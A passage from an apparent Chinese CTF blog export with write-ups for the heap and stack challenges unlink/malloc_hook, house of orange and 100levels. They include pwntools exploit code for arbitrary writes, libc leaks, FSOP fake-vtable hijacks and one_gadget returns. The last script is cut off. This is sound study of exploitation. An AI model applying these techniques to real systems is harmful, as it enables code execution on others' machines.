src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-01%20%E4%B8%8B%E5%8D%888.39.29.png\" alt=\"截屏2022-04-01 下午8.39.29\"></p>\n<p>​        非常之畸形。</p>\n<h2><span id=\"re\">re</span></h2><p>​        逻辑比较简单，结构体中只有一个chunk bp的字段。漏洞点也很魔幻，free只free结构体中保存的指针，而没有free malloc出来的ptr本身，并且没有置0，顺便edit的时候size没有限定，可以造成堆溢出。</p>\n<p>​        并且题目并没有可控的输出功能,虽然调用了<code>write()</code>，但是我们很难通过改got表来调用。    </p>\n<h2><span id=\"利用\">利用</span></h2><p>​        没有办法改got表，但是可以写shellcode。所以是不是能控制指针，add到栈上写shellcode呢？</p>\n<p>​        但是问题随即而来，我们有向栈上写shellcode的能力，但是如何控制程序执行？</p>\n<p>​        由于没有leak的机会，所以我们很难通过单纯向栈内写东西来使得shellcode执行，所以需要借用其他的函数，比如说将让<code>malloc_hook</code>指向<code>shellcode_addr</code>，这样就能执行了。（这一点是比较常见的思路，做过类似的题就能记住）</p>\n<p>​        但是第一步，我们需要一个任意地址写，来将shellcode写入。</p>\n<h3><span id=\"关于任意地址分配的疑思\">关于任意地址分配的疑思</span></h3><p>​        最开始还是因为没有看清楚，就以为这是一道fastbin double free，但这个题目前来说并没有办法找到比较简单好用的leak方式，并且后续的利用需要leak unsortedbin，这显然就不是fastbin的范围。（不过这里佬们看到uaf+edit堆溢出估计一眼unlink了吧）</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-02%20%E4%B8%8A%E5%8D%888.28.00.png\" alt=\"截屏2022-04-02 上午8.28.00\"></p>\n<p>​        虽然但是还是尝试了一下无脑改fd，但是无情的报错掐碎了我的幻想，之所以报错大概是我忘写chunk的size域，导致过不了检测。</p>\n<p>​        到这里就不再探讨fastbin attack了，一般来说在UAF的情况下构造非fastbin的任意地址写，也就剩unlink比较简单好用。</p>\n<h3><span id=\"大体思路\">大体思路</span></h3><p>​        先通过unlink，劫持chunk结构体，或者说buf中保存的指针，使其指向malloc_hook，再写shellcode，并修改malloc_hook为shellcode地址。</p>\n<h3><span id=\"unlink构造任意地址写\">unlink构造任意地址写</span></h3><p>​        需要使得unsortedbin的fd指向<code>malloc_hook</code>，就需要修改fd最低位为<code>\\x10</code>。这一点可以参考unsorted leak的一些知识点，因为<code>malloc_hook</code>和<code>main_arena</code>存在大小为0x10的固定偏移，而unsortedbin 链表的尾部bin的fd又是指向<code>main_arena</code>的某处的，所以一般来说只要修改这个fd为0x10就行。</p>\n<p>​        所以我们需要构造一个任意地址写来修改unsorted bin的fd。</p>\n<p>​        pps：由于我是废物，对于unlink还不是很熟练，所以需要花一些篇章来描述unlink的构造。</p>\n<p>​        草了。我突然意识到unlink构造是可以背板的，无非就是让写fake bk到fake fd指向的地方，然后劫持fake fd对应的指针。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;a&#x27;</span>)<span class=\"comment\">#idx0</span></span><br><span class=\"line\">add(<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;a&#x27;</span>)<span class=\"comment\">#idx1</span></span><br><span class=\"line\">add(<span class=\"number\">0x100</span>,<span class=\"string\">b&#x27;a&#x27;</span>)<span class=\"comment\">#idx2</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;a&#x27;</span>)<span class=\"comment\">#idx3</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x20</span> <span class=\"comment\">#padding</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x111</span>) <span class=\"comment\">#prev_size,size,</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x21</span>)</span><br><span class=\"line\">payload += p64(head + <span class=\"number\">8</span> - <span class=\"number\">0x18</span>)  <span class=\"comment\">#fake chunk fd</span></span><br><span class=\"line\">payload += p64(head + <span class=\"number\">8</span> - <span class=\"number\">0x10</span>)  <span class=\"comment\">#fake chunk bk</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x20</span>)  <span class=\"comment\"># next chunk&#x27;s prev_size to bypass the check</span></span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x110</span>, <span class=\"string\">b&#x27;a&#x27;</span>)<span class=\"comment\"># padding</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x100</span>)<span class=\"comment\"># Next_chunk&#x27;s prev_size field. Make it believe that prev chunk is free</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0x110</span>)<span class=\"comment\"># Next_chunk&#x27;s size field</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br></pre></td></tr></table></figure>\n<p>​        难绷。</p>\n<h3><span id=\"劫持ptr为shellcode地址\">劫持ptr为shellcode地址</span></h3><p>​        这样我们就劫持了idx1的指针，我们edit chunk的时候实际就是在修改指针使其指向任意地址。（这样看来其实这个部分和wiki上的unlink例题有点像。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">16</span></span><br><span class=\"line\">payload += p64(shellcode_addr)<span class=\"comment\">#chunk[0] to shellcode_addr</span></span><br><span class=\"line\">payload += p64(head + <span class=\"number\">6</span> * <span class=\"number\">8</span>)<span class=\"comment\">#chunk[1] to chunk[5]</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>)<span class=\"comment\">#chunk[2]</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>)<span class=\"comment\">#chunk[3]</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>\n<p>这样当我们再次编辑chunk0，就是在shellcode addr上写入数据了。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(shellcode),shellcode)</span><br></pre></td></tr></table></figure>\n<h3><span id=\"劫持main_arena为malloc-hook\">劫持main_arena为malloc hook</span></h3><p>​        光写入shellcode不够，我们还需要将<code>malloc_hook</code>的值改为<code>shellcode_addr</code>。</p>\n<p>​        所以我们需要改<code>main_arena</code>为<code>malloc hook</code>，具体原因以及方法之前已经分析过了。在前面的payload中，我们将chunk1的ptr修改为了chunk5的ptr，也就是链表尾部bin的地址，这个尾部bin的fd正好就是指向<code>main_arena</code>的，这样我们就能够单个字节覆盖fd，使其指向<code>malloc hook</code>。最后，我们直接再次edit这个chunk，让它的内容为shellcode地址即可。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">edit(<span class=\"number\">1</span>,<span class=\"number\">1</span>,<span class=\"string\">b&#x27;\\x10&#x27;</span>)</span><br><span class=\"line\">edit(<span class=\"number\">6</span>,<span class=\"number\">8</span>,p64(shellcode_addr))</span><br></pre></td></tr></table></figure>\n<p>​        下次一定。蚌埠住了。</p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​</p>\n","categories":["Binary_security"],"tags":["Chunk Overlapping"]},{"title":"攻防世界 - house of orange","url":"/2022/04/10/week6-7.2/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-chtlFgRo\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h1><span id=\"overview\">overview</span></h1><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8B%E5%8D%885.05.46.png\" alt=\"截屏2022-04-10 下午5.05.46\"></p>\n<h1><span id=\"逆向\">逆向</span></h1><p>​        没有free，只有增查改。</p>\n<p>​        这个题程序逻辑比较简单，主要是利用相对比较复杂。</p>\n<h2><span id=\"add\">add</span></h2><p>​        最多申请三个house。并且在申请house开始为每个house创建了0x10 size的结构体，只有两个字段，size和content ptr。在输入name的阶段会把name读入content ptr指向的地址。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Name :&quot;</span>);</span><br><span class=\"line\">read_str((<span class=\"keyword\">void</span> *)chunk_struct_ptr[<span class=\"number\">1</span>], size);</span><br></pre></td></tr></table></figure>\n<p>​        接着输入每个橘子的价钱和颜色。颜色不能自己指定，程序提供了一个抽象的菜单以供选择。我们看一下这个菜单。</p>\n<p>​        难绷。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8B%E5%8D%886.03.56.png\" alt=\"截屏2022-04-10 下午6.03.56\"></p>\n<p>​        价格被读入一个由<code>calloc()</code>创建的,只有一个size为8的item的chunk中。数量范围被限制在0-7或56746。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">read_str(*((<span class=\"keyword\">void</span> **)chunk_struct_ptr + <span class=\"number\">1</span>), size);</span><br><span class=\"line\">price_chunk = <span class=\"built_in\">calloc</span>(<span class=\"number\">1uLL</span>, <span class=\"number\">8uLL</span>);</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Price of Orange:&quot;</span>);</span><br><span class=\"line\">*price_chunk = read_num();</span><br><span class=\"line\">color_menu(); </span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Color of Orange:&quot;</span>);</span><br><span class=\"line\">color_num = read_num();</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( color_num != <span class=\"number\">56746</span> &amp;&amp; (color_num &lt;= <span class=\"number\">0</span> || color_num &gt; <span class=\"number\">7</span>) )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;No such color&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( color_num == <span class=\"number\">0xDDAA</span> )</span><br><span class=\"line\">  \tprice_chunk[<span class=\"number\">1</span>] = <span class=\"number\">0xDDAA</span>;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    price_chunk[<span class=\"number\">1</span>] = color_num + <span class=\"number\">30</span>;</span><br><span class=\"line\">*chunk_struct_ptr = price_chunk;</span><br><span class=\"line\">qword_203068 = chunk_struct_ptr;</span><br><span class=\"line\">++idx;</span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<p>​        </p>\n<p>​        当颜色为56746时，将对应price chunk的第二个字段覆盖为0xddaa。然后就直接把price_chunk的指针保存到<code>chunk_struct_ptr</code>的开头。接着把<code>chunk_struct_ptr</code>保存到bss段上。</p>\n<p>​        另外全程也没有看到和idx有关的指针操作，估计也是只能控制一个house。</p>\n<p>​        </p>\n<h2><span id=\"show\">show</span></h2><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8B%E5%8D%888.26.14.png\" alt=\"截屏2022-04-10 下午8.26.14\"></p>\n<p>​        不得不说这个活整得真得很，，可爱。</p>\n<p>​        也就是，输入56746会获得橙色的橘子。</p>\n<p>​        所以两个show的逻辑基本一致，就是show出house的名字和价格，颜色就纯纯整活。</p>\n<h2><span id=\"edit\">edit</span></h2><p>​        有很明显的堆溢出漏洞。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Name:&quot;</span>);</span><br><span class=\"line\">  read_str((<span class=\"keyword\">void</span> *)buf[<span class=\"number\">1</span>], num);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Price of Orange: &quot;</span>);</span><br><span class=\"line\">  v1 = (_DWORD *)*buf;</span><br><span class=\"line\">  *v1 = read_num();</span><br></pre></td></tr></table></figure>\n<p>ps：写菜单的时候不要看错了，这个“Name：”的冒号前面没有空格，蚌埠住了。</p>\n<h1><span id=\"利用\">利用</span></h1><h2><span id=\"整体思路\">整体思路</span></h2><p>​        这道题是经典题了，堆上的话肯定就是利用堆溢出修改top chunk size，以获得unsorted bin。但是后面的利用我就不会了，因为没有做过io_file的题。所以我自己做的话就做到获得unsorted bin为止了。</p>\n<h2><span id=\"修改top-chunk-size\">修改top chunk size</span></h2><p>随便覆盖一些，果然能把top chunk size覆盖，因此我们可以计算需要覆盖的值。</p>\n<p>我这里的堆地址比较畸形，就是都是7f开头的，不过目前不影响，之前的top chunk size为0x20f91，地址是070，加起来正好是0x1000，所以我们只需要覆盖为f91就能实现页对齐。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x20</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x20</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x21</span>) + <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x10</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0xf91</span>)</span><br><span class=\"line\">edit(<span class=\"built_in\">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>\n<h2><span id=\"获得unsorted-binleak-libc\">获得unsorted bin，leak libc</span></h2><p>​        然后直接申请一个0x1000大小的chunk，让堆以brk的形式拓展，就获得了0xf91大小的unsorted bin。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-10%20%E4%B8%8B%E5%8D%8810.02.34.png\" alt=\"截屏2022-04-10 下午10.02.34\"></p>\n<p>​        接着我们还需要leak libc和heap，这里我们可以直接申请一个比较大的范围为large chunk的name，使其能够同时leak libc地址和heap基址。能够同时leak当然是因为large chunk的<code>fd_nextsize</code>与<code>bk_nextsize</code>字段。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-11%20%E4%B8%8B%E5%8D%883.07.41.png\" alt=\"截屏2022-04-11 下午3.07.41\"></p>\n<p>​        当然如果只是申请small chunk大小的话就只能leak libc，heap需要另外leak。不过接收的话还是要分别来。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x1000</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x1000</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x400</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;aaaaaaaa&quot;</span>)</span><br><span class=\"line\">malloc_hook = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)) - <span class=\"number\">88</span> - <span class=\"number\">0x10</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;malloc_hook =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(malloc_hook)))</span><br><span class=\"line\">libc_base = malloc_hook - libc.symbols[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_base =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(libc_base)))</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0x400</span>,<span class=\"string\">b&#x27;b&#x27;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">show()</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&quot;b&quot;</span>*<span class=\"number\">0x10</span>)</span><br><span class=\"line\">heap_addr = u64(p.recvuntil(<span class=\"string\">b&#x27;\\n&#x27;</span>,drop=<span class=\"literal\">True</span>).ljust(<span class=\"number\">0x8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>)) - <span class=\"number\">0xd0</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;heap_addr =&gt; &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(heap_addr)))</span><br></pre></td></tr></table></figure>\n<p>​        </p>\n<p>​        接下来就是io_file的利用了。</p>\n<h2><span id=\"fsop\">FSOP</span></h2><p>​        由于之前从来咩有做过io_file，所以为了好归纳我就还是再开一篇笔记来专门做io_file的学习笔记吧。等把fsop看完了再来把这个当做例题看。</p>\n<p>​        看完了fsop，回来做题了。</p>\n<p>​        有一个比较奇怪的点，就是这道题我没有猜错的话最早的libc版本应该是libc-2.23.so，但是攻防世界提供的版本是2.19，虽然从io_file利用的角度来看两者其实区别挺大的吗，但是由于这个题目本身的限制非常之多，以至于两个版本实则没有什么大致的区别，并且因为攻防世界的libc没有调试符号，所以我索性就用2.23来做了。</p>\n<p>​        在之前的步骤里我们获得了一个unsortedbin，这也是为什么说这道题的限制非常多，因为我们可以利用的也就只有这一个bin了，所以一般的堆利用方法几乎都失效了。</p>\n<p>​        但是好巧不巧，我们就是能通过这一个bin来实现对于<code>io_list_all</code>的劫持。</p>\n<p>​        但是在考虑这道题情况下的fsop前，我们需要先复习一下普通情况下的fsop，搞清楚几个链表节点以及结构体之间的关系。</p>\n<p>​        实际上我们只需要劫持<code>io_list_all</code>，并把它指向我们伪造的结构体。fake struct需要绕过一些比较简单的检测，然后在结构体内部的字段伪造vtable，并将vtable指向的地方修改为我们想要的函数地址。</p>\n<h3><span id=\"劫持io_list_all\">劫持io_list_all</span></h3><p>​        首先我们需要劫持<code>io_list_all</code>，使它指向我们可以控制的内存区域。</p>\n<p>​        这里会用到<code>unsorted bin attack</code>。将unsorted bin chunk的bk指向<code>_IO_list_all - 0x10</code>，那么就能通过 <code>bck-&gt;fd = unsorted_chunks (av);</code>使<code>io_list_all</code>指向<code>&amp;main_arena+88</code>        。<code>_IO_list_all</code>是位于libc中的全局变量，所以它的地址可以直接通过leak得到。</p>\n<p>​        然后需要伪造结构体，这里面的逻辑比较抽象，大部分原因是我对于这种large bin或者smallbin以及一些结构，还有堆上chunk分配流程的不熟悉，但是我也只能象征性地去理解了。</p>\n<p>​        最后看一眼伪造前的heap</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-11%20%E4%B8%8B%E5%8D%884.31.34.png\" alt=\"截屏2022-04-11 下午4.31.34\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-11%20%E4%B8%8B%E5%8D%884.33.06.png\" alt=\"截屏2022-04-11 下午4.33.06\">        </p>\n<h3><span id=\"伪造结构体\">伪造结构体</span></h3><p>​            对于unsorted bin的bk指针，我们直接覆盖为<code>_IO_list_all_addr - 0x10</code>。</p>\n<p>​        按照前面的分析，当我们将unsorted bin取出的时候，就会触发<code>bck-&gt;fd =unsortedbin(av)</code>操作。所以还是回到之前非常抽象的利用方式上，unsorted bin的取出环节实际是通过调用<code>_IO_flush_all_lockp</code>实现的，我们退出程序时，程序会自动调用这个函数，此时我们的<code>_IO_list_all_addr</code>就被指向<code>&amp;main_arena + 88</code>，也就是此时已经成功地将<code>io_list_all</code>劫持，我们只需要在<code>&amp;main_arena + 88</code>指向的地址中构造fake struct就行。</p>\n<p>​        虽然但是，程序并没有给我们机会让我们在&amp;main_arena + 88所指向的地方伪造chunk。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-11%20%E4%B8%8B%E5%8D%885.09.35.png\" alt=\"截屏2022-04-11 下午5.09.35\"></p>\n<p>​        所以我们选择利用下一个节点，这个节点在结构体中的偏移为0x68，也就是<code>&amp;main_arena + 88 + 0x68</code>，正好也是smallbin[6]的位置，所以我们希望能够伪造这个small chunk作为fake struct。</p>\n<p>​        当unsortedbin size为0x60，当unsortedbin被取出，正好就会被放到这个0x60（？？？？？？？？）大小的small chunk中，我们所覆盖的fake struct也就生效了。</p>\n<p>​        我只想问一个问题，为什么会有0x60的small chunk？</p>\n<p>​        先用垃圾数据把原本的chunk填充。然后为了伪造fake chunk，首先要把上一个chunk的price结构体还原。    </p>\n<p>​        然后溢出unsortedbin，这里被溢出的chunk就是之前利用house of orange从top chunk获得的unsortedbin chunk。将chunk的size改为0x61。</p>\n<p>​        接着填充bk，劫持指针。然后就是具体的fake struct的内容，首先需要绕过检测，具体可以看FSOP原理。</p>\n<p>​        然后在fake struct填上vtable的地址，这里是heap+0x510。这个偏移的计算就是此时vtable相对于heap base的偏移加上0x20。也就是这个填入system的地址就是vtable addr指向的地方。</p>\n<p>​        我佛慈悲。        </p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span> * <span class=\"number\">0x400</span> + p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x21</span>) + p64(<span class=\"number\">0x1f00000000</span>) + p64(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span> + p64(<span class=\"number\">0x61</span>)</span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>) + p64(_IO_list_all_addr - <span class=\"number\">0x10</span>)<span class=\"comment\">#modify bk to  _IO_list_all_addr - 0x10 </span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">1</span>) <span class=\"comment\">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0xc0</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>) </span><br><span class=\"line\">payload += p32(<span class=\"number\">0</span>) <span class=\"comment\">#_mode&lt;=0</span></span><br><span class=\"line\">payload += p32(<span class=\"number\">0</span>) + p64(<span class=\"number\">0</span>) * <span class=\"number\">2</span></span><br><span class=\"line\">payload += p64(vtable_addr)<span class=\"comment\">#a pointer</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>) * <span class=\"number\">3</span> </span><br><span class=\"line\">payload += p64(system_addr)<span class=\"comment\">#vtable + offset</span></span><br><span class=\"line\">edit(<span class=\"built_in\">len</span>(payload),payload)</span><br></pre></td></tr></table></figure>\n","categories":["Binary_security"],"tags":["HEAP - House Of Orange"]},{"title":"攻防世界 - 100levels","url":"/2022/04/11/week7-1.1/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-WAnxkjRs\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div> </p>\n<h2><span id=\"overview\">overview</span></h2><p>partial relro，没有canary，栈溢出。</p>\n<h3><span id=\"逆向\">逆向</span></h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( unk_20208C )</span><br><span class=\"line\">  <span class=\"built_in\">sprintf</span>(v1, <span class=\"string\">&quot;Hint: %p\\n&quot;</span>, &amp;system);</span><br></pre></td></tr></table></figure>\n<p>​        如果能在这个变量上写东西，就能leak。那就不是ret2libc了。并且开了pie，也不好rop。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 buf[<span class=\"number\">4</span>]; <span class=\"comment\">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(buf, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(buf));</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x1F</span>uLL) &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> strtol((<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)buf, <span class=\"number\">0LL</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​        有栈溢出。</p>\n<p>​        算数游戏内也有</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Question: %d * %d = ? Answer:&quot;</span>, v6, v5);</span><br><span class=\"line\">read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x400</span>uLL);</span><br></pre></td></tr></table></figure>\n<h3><span id=\"我的疑思\">我的疑思</span></h3><p>​        套板子不太行，还是需要想个办法把system打印出来，然后直接用system来rop。</p>\n<p>​        但是说实话，没有思路。这个bss上的全局变量没有任何与程序上的关联，也不太可能通过输入什么东西溢出到那，唯一的可能就是构造任意地址写。</p>\n<p>​        但是我们能够利用的只有一个没办法进行rop的程序执行流跳转，不leak基址都是白搭。所以虽然程序给了partial relro，但是在leak前修改got的可能性非常小，而改got还是得需要地址。</p>\n<p>​        难绷，去看了wp，发现这得看汇编才能找到突破点。</p>\n<h3><span id=\"利用\">利用</span></h3><p>​            <img src=\"/Users/rin/Library/Application Support/typora-user-images/截屏2022-04-11 下午9.35.53.png\" alt=\"截屏2022-04-11 下午9.35.53\"></p>\n<p>​        这个题的突破点就在于，不管这个全局变量是不是有值，在调用hint函数后system都会被加载在hint栈帧的rbp+0x110处。并且，如果我们开始游戏的输入level环节输入了小于0的数，那么这个变量将不会被初始化，</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-04-11%20%E4%B8%8B%E5%8D%8810.06.55.png\" alt=\"截屏2022-04-11 下午10.06.55\"></p>\n<p>​        也就是如果在输入v4的时候输入0，v4就还是system的地址，在第二次输入的时候输入system与<code>one_gadget</code>的偏移，就能使v5变为<code>one_gadget</code>的地址。这样我们就获得了一个栈上的可以利用的地址。</p>\n<p>​        但是如何ret到这个地址呢？</p>\n<p>​        观察栈帧，可以发现，当我们选择在play函数中溢出，play函数上一个函数栈帧，也就是run函数的物理相邻，正好就是run函数的函数局部变量，而system的地址与play的返回地址就只差了24字节。</p>\n<p>​        如果是一般的栈题我们可以直接用ret或者pop调栈，但是由于pie我们无法进行普通的rop，但是可以利用到vsyscall做到相似的结果。</p>\n<p>​        vsyscall并不受pie影响，始终在<code>0xffffffffff600000-0xffffffffff601000</code>区域内，所以我们可以在返回地址连续填写三次vsyscall，获得类似ret的效果。</p>\n<p>​        但是需要注意的是因为之前level被改成了地址，所以是大于100的，于是需要先写脚本进行99次游戏，才能在最后一次的时候覆盖返回地址。</p>\n<p>​        exp直接copy了，我这里应该调不动。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> LibcSearcher</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./100levels&quot;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./100levels&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">one_gadget = <span class=\"number\">0x45216</span></span><br><span class=\"line\">sys_addr = <span class=\"number\">0x45390</span></span><br><span class=\"line\">offset = one_gadget - sys_addr</span><br><span class=\"line\">vsys_addr = <span class=\"number\">0xffffffffff600007</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">play</span>():</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;Question: &#x27;</span>)</span><br><span class=\"line\">    a = p.recvuntil(<span class=\"string\">&#x27; &#x27;</span>)</span><br><span class=\"line\">    a = a[:-<span class=\"number\">1</span>]</span><br><span class=\"line\">    a = <span class=\"built_in\">int</span>(a, <span class=\"number\">10</span>)</span><br><span 